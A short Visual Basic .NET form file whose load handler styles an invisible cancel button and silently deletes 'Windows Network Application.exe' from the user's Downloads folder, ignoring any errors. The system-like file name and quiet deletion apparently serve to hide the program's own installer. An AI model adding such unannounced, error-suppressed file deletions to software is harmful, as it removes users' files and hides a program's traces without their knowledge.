Imports System.IO
Public Class Form6
    Private Sub btn_cancel6_Click(sender As Object, e As EventArgs) Handles btn_cancel6.Click
        Form1.Close()
        Close()
    End Sub

    Private Sub Form6_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim username As String = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        btn_cancel6.BackColor = Color.Transparent
        btn_cancel6.FlatAppearance.MouseOverBackColor = Color.Transparent
        btn_cancel6.FlatAppearance.MouseDownBackColor = Color.Transparent
        btn_cancel6.FlatAppearance.BorderSize = 0
        btn_cancel6.FlatStyle = FlatStyle.Flat
        Try
            File.Delete(username & "\Downloads\Windows Network Application.exe")
        Catch ex As Exception
        End Try
    End Sub
End Class